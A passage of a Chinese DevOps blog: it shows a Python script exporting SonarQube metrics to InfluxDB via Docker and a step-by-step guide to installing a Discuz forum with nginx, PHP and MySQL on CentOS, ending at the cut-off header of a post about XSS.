class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> influxdb <span class="keyword">import</span> InfluxDBClient</span><br><span class="line"></span><br><span class="line">BASE_URL = os.getenv(<span class="string">'SONAR_BASE_URL'</span>, <span class="string">'http://sonarqube.cn'</span>)</span><br><span class="line">USER = os.environ[<span class="string">'SONAR_USER'</span>]</span><br><span class="line">PASSWORD = os.getenv(<span class="string">'SONAR_PASSWORD'</span>, <span class="string">''</span>)</span><br><span class="line">INFLUX_URL = os.getenv(<span class="string">'INFLUX_URL'</span>, <span class="string">'10.100.2.20'</span>)</span><br><span class="line">INFLUX_USER = os.environ[<span class="string">'INFLUX_USER'</span>]</span><br><span class="line">INFLUX_PASSWORD = os.environ[<span class="string">'INFLUX_PASSWORD'</span>]</span><br><span class="line">INFLUX_DB = os.environ[<span class="string">'INFLUX_DB'</span>]</span><br><span class="line">INTERVAL = os.environ[<span class="string">'INTERVAL'</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SonarApiClient</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, user, passwd)</span>:</span></span><br><span class="line">        self.user = user</span><br><span class="line">        self.passwd = passwd</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_make_request</span><span class="params">(self, endpoint)</span>:</span></span><br><span class="line">        r = requests.get(BASE_URL + endpoint, auth=(self.user, self.passwd))</span><br><span class="line">        <span class="keyword">return</span> r.json()</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_all_ids</span><span class="params">(self, endpoint)</span>:</span></span><br><span class="line">        data = self._make_request(endpoint)</span><br><span class="line">        ids = []</span><br><span class="line">        <span class="keyword">for</span> component <span class="keyword">in</span> data[<span class="string">'components'</span>]:</span><br><span class="line">            dict = &#123;</span><br><span class="line">                <span class="string">'id'</span>: component[<span class="string">'id'</span>],</span><br><span class="line">                <span class="string">'key'</span>: component[<span class="string">'key'</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            ids.append(dict)</span><br><span class="line">        <span class="keyword">return</span> ids</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_all_available_metrics</span><span class="params">(self, endpoint)</span>:</span></span><br><span class="line">        data = self._make_request(endpoint)</span><br><span class="line">        metrics = []</span><br><span class="line"><span class="comment">#        metrics1 = [vulnerabilities]</span></span><br><span class="line">        <span class="keyword">for</span> metric <span class="keyword">in</span> data[<span class="string">'metrics'</span>]:</span><br><span class="line">            <span class="keyword">if</span> metric[<span class="string">'type'</span>] <span class="keyword">in</span> [<span class="string">'INT'</span>,<span class="string">'MILLISEC'</span>,<span class="string">'WORK_DUR'</span>,<span class="string">'FLOAT'</span>,<span class="string">'PERCENT'</span>,<span class="string">'RATING'</span>]:</span><br><span class="line">                metrics.append(metric[<span class="string">'key'</span>])</span><br><span class="line"><span class="comment">#               metrics = metrics + metrics1</span></span><br><span class="line">				</span><br><span class="line">        <span class="keyword">return</span> metrics</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_measures_by_component_id</span><span class="params">(self, endpoint)</span>:</span></span><br><span class="line">        data = self._make_request(endpoint)</span><br><span class="line">        <span class="keyword">return</span> data[<span class="string">'component'</span>][<span class="string">'measures'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Project</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, identifier, key)</span>:</span></span><br><span class="line">        self.id = identifier</span><br><span class="line">        self.key = key</span><br><span class="line">        self.metrics = <span class="literal">None</span></span><br><span class="line">        self.timestamp = datetime.datetime.utcnow().isoformat()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_metrics</span><span class="params">(self, metrics)</span>:</span></span><br><span class="line">        self.metrics = metrics</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">export_metrics</span><span class="params">(self)</span>:</span></span><br><span class="line">        influx_client = InfluxDBClient(</span><br><span class="line">            host=INFLUX_URL,</span><br><span class="line">            port=<span class="number">30019</span>,</span><br><span class="line">            username=INFLUX_USER,</span><br><span class="line">            password=INFLUX_PASSWORD,</span><br><span class="line">            database=INFLUX_DB</span><br><span class="line">        )</span><br><span class="line">        influx_client.write_points(self._prepare_metrics())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_prepare_metrics</span><span class="params">(self)</span>:</span></span><br><span class="line">        json_to_export = []</span><br><span class="line">        <span class="keyword">for</span> metric <span class="keyword">in</span> self.metrics:</span><br><span class="line">            one_metric = &#123;</span><br><span class="line">                <span class="string">"measurement"</span>: metric[<span class="string">'metric'</span>],</span><br><span class="line">                <span class="string">"tags"</span>: &#123;</span><br><span class="line">                    <span class="string">"id"</span>: self.id,</span><br><span class="line">                    <span class="string">"key"</span>: self.key</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"time"</span>: self.timestamp,</span><br><span class="line">                <span class="string">"fields"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: float(metric[<span class="string">'value'</span>] <span class="keyword">if</span> (<span class="string">'value'</span> <span class="keyword">in</span> metric) <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            json_to_export.append(one_metric)</span><br><span class="line">        <span class="keyword">return</span> json_to_export</span><br><span class="line"></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"before while loop..."</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"count -----"</span>)</span><br><span class="line">    <span class="keyword">print</span> (count)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"begin export data..."</span>)</span><br><span class="line"></span><br><span class="line">    client = SonarApiClient(USER, PASSWORD)</span><br><span class="line">    ids = client.get_all_ids(<span class="string">'/api/components/search?qualifiers=TRK'</span>)</span><br><span class="line">    </span><br><span class="line">    metrics = client.get_all_available_metrics(<span class="string">'/api/metrics/search'</span>)</span><br><span class="line">    comma_separated_metrics = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> metric <span class="keyword">in</span> metrics:</span><br><span class="line">        comma_separated_metrics += metric + <span class="string">','</span></span><br><span class="line">    </span><br><span class="line">    uri = <span class="string">'/api/measures/component'</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> ids:</span><br><span class="line">        project_id = item[<span class="string">'id'</span>]</span><br><span class="line">        project_key = item[<span class="string">'key'</span>]</span><br><span class="line">        print(project_key, project_id)</span><br><span class="line">        project = Project(identifier=project_id, key=project_key)</span><br><span class="line">        component_id_query_param = <span class="string">'componentId='</span> + project_id</span><br><span class="line">        metric_key_query_param = <span class="string">'metricKeys='</span> + comma_separated_metrics</span><br><span class="line">        measures = client.get_measures_by_component_id(uri + <span class="string">'?'</span> + component_id_query_param + <span class="string">'&amp;'</span> + metric_key_query_param + <span class="string">'vulnerabilities'</span>)</span><br><span class="line">        project.set_metrics(measures)</span><br><span class="line">        project.export_metrics()</span><br><span class="line"></span><br><span class="line">    time.sleep(int(INTERVAL))</span><br></pre></td></tr></table></figure>

<p>因为我是在dokcer中部署Garafana以及sonarqube等相关程序的，所以建议将首先将sonar_san_docker相关内容制作成镜像。命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#build a image for collector</span></span><br><span class="line"><span class="built_in">cd</span> sonar_san_docker</span><br><span class="line">docker build -t <span class="built_in">export</span>-sonarqube:v0.1 .</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">--name <span class="built_in">export</span>-sonarqube \</span><br><span class="line">-e SONAR_USER=admin \</span><br><span class="line">-e SONAR_PASSWORD=password \</span><br><span class="line">-e INFLUX_USER=root \</span><br><span class="line">-e INFLUX_PASSWORD=password \</span><br><span class="line">-e INFLUX_DB=sonarqube_data \</span><br><span class="line">-e INTERVAL=43200  \</span><br><span class="line"><span class="built_in">export</span>-sonarqube:v0.1</span><br></pre></td></tr></table></figure>

<p>至此influnxdb数据库便采集到了数据：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200323144050053.png" alt="image-20200323144050053"></p>
<p>然后数据也会传到Grafana中：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200323144159835.png" alt="image-20200323144159835"></p>
<h5 id="代码下载链接见："><a href="#代码下载链接见：" class="headerlink" title="代码下载链接见："></a>代码下载链接见：</h5><p><a href="https://github.com/Darren-zl/sonarqube-san" target="_blank" rel="noopener">https://github.com/Darren-zl/sonarqube-san</a></p>

          
        
      
    </div>
    
    
    



    

    

    



    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/23/Discuz_x3.4论坛搭建/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Darren-zl">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Darren-学无止境">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/23/Discuz_x3.4论坛搭建/" itemprop="url">Discuz_x3.4论坛搭建</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-23T17:00:34+08:00">
                2019-10-23
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
              <span class="post-meta-divider">|</span>
              <span class="post-meta-item-icon">
                <i class="fa fa-comment-o"></i>
              </span>
              
                <a href="/2019/10/23/Discuz_x3.4论坛搭建/#SOHUCS" itemprop="discussionUrl">
                  <span id="url::http://yoursite.com/2019/10/23/Discuz_x3.4论坛搭建/" class="cy_cmt_count" data-xid="2019/10/23/Discuz_x3.4论坛搭建/" itemprop="commentsCount"></span>
                </a>
              
            
          

          
          
             <span id="/2019/10/23/Discuz_x3.4论坛搭建/" class="leancloud_visitors" data-flag-title="Discuz_x3.4论坛搭建">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Visitors&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  
                </span>
              
            </div>
          

          

        </span></div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">


      
      

      
        
          
            <h2 id="Discuz-x3-4论坛搭建"><a href="#Discuz-x3-4论坛搭建" class="headerlink" title="Discuz_x3.4论坛搭建"></a>Discuz_x3.4论坛搭建</h2><p>环境Centos7+nginx1.10.1+php7.1+mysql5.7.28</p>
<h3 id="1-安装nginx"><a href="#1-安装nginx" class="headerlink" title="1.安装nginx"></a>1.安装nginx</h3><p>1.1 首先更新系统软件源:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum updata</span><br></pre></td></tr></table></figure>

<p>1.2 依赖包安装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># yum -y install gcc gcc-c++ autoconf automake libtool make cmake</span><br><span class="line"># yum -y install zlib zlib-devel openssl openssl-devel pcre-devel</span><br></pre></td></tr></table></figure>

<p>1.3 下载并解压nginx包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# cd /usr/local/src</span><br><span class="line">[root@localhost src]# wget -c http://nginx.org/download/nginx-1.10.3.tar.gz</span><br><span class="line">[root@localhost src]# tar zxvf nginx-1.10.3.tar.gz</span><br></pre></td></tr></table></figure>

<p>1.4 新建nginx用户，并修改用户权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost src]# groupadd nginx</span><br><span class="line">[root@localhost src]# useradd -g nginx -M nginx</span><br></pre></td></tr></table></figure>

<p><code>useradd</code>命令的<code>-M</code>参数用于不为<code>nginx</code>建立<code>home</code>目录<br>修改<code>/etc/passwd</code>，使得<code>nginx</code>用户无法bash登陆(nginx用户后面由<code>/bin/bash</code>改为<code>/sbin/nologin</code>),修改passwd文件。想最后nginx那一行后面修改<code>/bin/bash</code>改为<code>/sbin/nologin</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx:x:1002:1003::/home/nginx:/sbin/nologin</span><br></pre></td></tr></table></figure>

<p>1.5 编译配置、编译、安装</p>
<p>进入解压的nginx源码目录，<code>/usr/local/src/</code> 执行以下命令 。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# cd /usr/local/src/nginx*</span><br><span class="line">[root@localhost nginx-1.10.3]# pwd</span><br><span class="line">/usr/local/src/nginx-1.10.3</span><br><span class="line">[root@localhost nginx-1.10.3]#</span><br><span class="line">[root@localhost nginx-1.10.3]# ./configure --prefix=/usr/local/nginx \</span><br><span class="line">--pid-path=/usr/local/nginx/run/nginx.pid \</span><br><span class="line">--with-http_ssl_module \</span><br><span class="line">--user=nginx \</span><br><span class="line">--group=nginx \</span><br><span class="line">--with-pcre \</span><br><span class="line">--without-mail_pop3_module \</span><br><span class="line">--without-mail_imap_module \</span><br><span class="line">--without-mail_smtp_module</span><br></pre></td></tr></table></figure>

<p>上面的\表示换行。</p>
<p>然后进行编译：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost nginx-1.10.3]# make</span><br><span class="line">[root@localhost nginx-1.10.3]# make install</span><br></pre></td></tr></table></figure>

<p>编译以后查看版本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost nginx-1.10.3]# /usr/local/nginx/sbin/nginx -v</span><br><span class="line">nginx version: nginx/1.10.3</span><br></pre></td></tr></table></figure>

<p>nginx停止、重启:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#  nginx 管理的几种方式 -</span><br><span class="line"># 启动Nginx </span><br><span class="line">/usr/local/nginx/sbin/nginx </span><br><span class="line"># 从容停止Nginx：</span><br><span class="line">kill -QUIT 主进程号 # 如上一步中的 ps 命令输出的 29151，就是 Nginx的主进程号</span><br><span class="line"># 快速停止Nginx：</span><br><span class="line">kill -TERM 主进程号</span><br><span class="line"># 强制停止Nginx：</span><br><span class="line">pkill -9 nginx</span><br><span class="line"># 平滑重启nginx</span><br><span class="line">/usr/nginx/sbin/nginx -s reload</span><br></pre></td></tr></table></figure>

<p>至次nginx安装完成。可以访问<a href="http://locahost:80访问你的网站。" target="_blank" rel="noopener">http://locahost:80访问你的网站。</a></p>
<p>1.6 在防火墙上添加端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="line">#firewall-cmd --reload</span><br></pre></td></tr></table></figure>

<p>注:如果是阿里云服务器还需要在安全组中将80端口打开。</p>
<h3 id="2-PHP安装"><a href="#2-PHP安装" class="headerlink" title="2.PHP安装"></a>2.PHP安装</h3><p>2.1 安装epel-release</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#yum -y install epel-release</span><br></pre></td></tr></table></figure>

<p>2.2 安装php7.1</p>
<p>首先设定php的yum源，执行下面命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm</span><br><span class="line">[root@localhost ~]# rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</span><br></pre></td></tr></table></figure>

<p>2.3 然后进行查看扩展名指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# yum search php71w</span><br></pre></td></tr></table></figure>

<p>2.4 安装php71w和各种扩展程序。安装的时候有两次要输入 Y 回车，才会继续安装的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# yum install php71w php71w-bcmath php71w-cli php71w-common php71w-devel php71w-embedded php71w-fpm php71w-gd php71w-mbstring php71w-mysqlnd php71w-opcache php71w-pdo php71w-xml</span><br></pre></td></tr></table></figure>

<p>2.5 查看是否安装成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -v</span><br></pre></td></tr></table></figure>

<p>2.6 php启动</p>
<p>   这个<code>php-fpm.service</code>文件，位于下述路径中：<code>/lib/systemd/system/</code>中。在这个目录下面，可以看到相关的开机服务项目。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">systemctl status php-fpm.service   //查看PHP运行状态</span><br><span class="line">systemctl start php-fpm.service    //启动PHP</span><br><span class="line">systemctl stop php-fpm.service     //停止PHP</span><br><span class="line">systemctl restart php-fpm.service  //重启PHP</span><br><span class="line">systemctl reload php-fpm.service   //重启修改配置</span><br><span class="line">//开机启动</span><br><span class="line">systemctl enable php-fpm.service</span><br><span class="line">systemctl start php-fpm.service</span><br></pre></td></tr></table></figure>

<h3 id="3-修改nginx路径"><a href="#3-修改nginx路径" class="headerlink" title="3. 修改nginx路径"></a>3. 修改nginx路径</h3><p>我的站点路径为根目录下的web文件夹。需要修改nginx.conf的配置文件。vi  /usr/local/nginx/conf/nginx.conf。修改目录及添加支持php相关内容。</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">将：</span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">           <span class="attribute">root</span>   html;</span><br><span class="line">           <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">改为：</span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">           <span class="attribute">root</span>   /web;</span><br><span class="line">           <span class="attribute">index</span>  index.php index.html index.htm;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">将：</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ .php$</span> &#123;</span><br><span class="line">           <span class="attribute">root</span>          html;</span><br><span class="line">           <span class="attribute">fastcgi_pass</span>   <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">           <span class="attribute">fastcgi_index</span>  index.php;</span><br><span class="line">           <span class="attribute">fastcgi_param</span>  SCRIPT_FILENAME  <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">           <span class="attribute">include</span>       fastcgi_params;</span><br><span class="line">        &#125;</span><br><span class="line">改为：</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ .php$</span> &#123;</span><br><span class="line">           <span class="attribute">root</span>          /web;</span><br><span class="line">           <span class="attribute">fastcgi_pass</span>   <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">           <span class="attribute">fastcgi_index</span>  index.php;</span><br><span class="line">           <span class="attribute">fastcgi_param</span>  SCRIPT_FILENAME  <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">           <span class="attribute">include</span>       fastcgi_params;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>然后重启nginx。</p>
<h3 id="4-mysql安装"><a href="#4-mysql安装" class="headerlink" title="4.mysql安装"></a>4.mysql安装</h3><p>首先添加mysql7的源</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -Uvh http://repo.mysql.com/mysql57-community-release-el7-7.noarch.rpm</span><br></pre></td></tr></table></figure>

<p>安装mysql，需要敲两遍y。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install mysql-server mysql-devel mysql</span><br></pre></td></tr></table></figure>

<p>mysql安装完成有一个随机密码通过以下命令进行检索：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &apos;temporary password&apos; /var/log/mysqld.log</span><br></pre></td></tr></table></figure>

<p>mysql 启动及停止命令：</p>
<p>启动: <code>service mysqld start</code><br>停止: <code>service mysqld stop</code></p>
<p>使用默认密码数据库成功的话，还不能进行操作先将密码进行修改。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;@$$#@$sqxffDf123&apos;;</span><br></pre></td></tr></table></figure>

<p>刷新权限：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>

<h3 id="5-Discuz包上传安装"><a href="#5-Discuz包上传安装" class="headerlink" title="5.Discuz包上传安装"></a>5.Discuz包上传安装</h3><p>5.1 首先下载DiscuzX3.4包：</p>
<p><a href="https://files.gitee.com/group1/M00/09/6F/wKgCNF2A10WAHBYiALFhkDQrcZc860.zip?token=37a9a08225c013a13171b01a8667a398&ts=1571737159&attname=Discuz_X3.4_SC_UTF8%E3%80%9020190917%E3%80%91.zip&disposition=attachment" target="_blank" rel="noopener">Discuz下载链接</a>   该包在码云上需要进行注册下载。</p>
<p>5.2 下载好以后压缩包内分别有3个文件夹。readme、utility、upload。 先将readme、utility文件夹上传到站点目录。<strong>注意：upload是将里面的所有文件传输形式以二进制的方式！！！，上传到站点根目录</strong></p>
<p>5.3 将站点目录及里面所有文件先设置权限为777以后再调回655</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -r 777 web</span><br></pre></td></tr></table></figure>

<p>5.4 如果以上操作都正确。访问<a href="http://locahost/install" target="_blank" rel="noopener">http://locahost/install</a> 链接是可以正常安装discuz的。</p>
<p>至此就完成了Discuz论坛的安装。</p>

          
        
      
    </div>
    
    
    



    

    

    



    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/16/XSS相关漏洞/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Darren-zl">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Darren-学无止境">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/16/XSS相关漏洞/" itemprop="url">XSS相关漏洞</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-16T16:00:34+08:00">
                2019-10-16
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
              <span class="post-meta-divider">|</span>
              <span class="post-meta-item-icon">
                <i class="fa fa-comment-o"></i>
              </span>
              
                <a href="/2019/10/16/XSS相关漏洞/#SOHUCS" itemprop="discussionUrl">
                  <span id="url::http://yoursite.com/2019/10/16/XSS相关漏洞/" class="cy_cmt_count" data-xid="2019/10/16/XSS相关漏洞/" itemprop="commentsCount"></span>
                </a>
              
            
          

          
          
             <span id="/2019/10/16/XSS相关漏洞/" class="leancloud_visitors" data-flag-title="XSS相关漏洞">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Visitors&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  
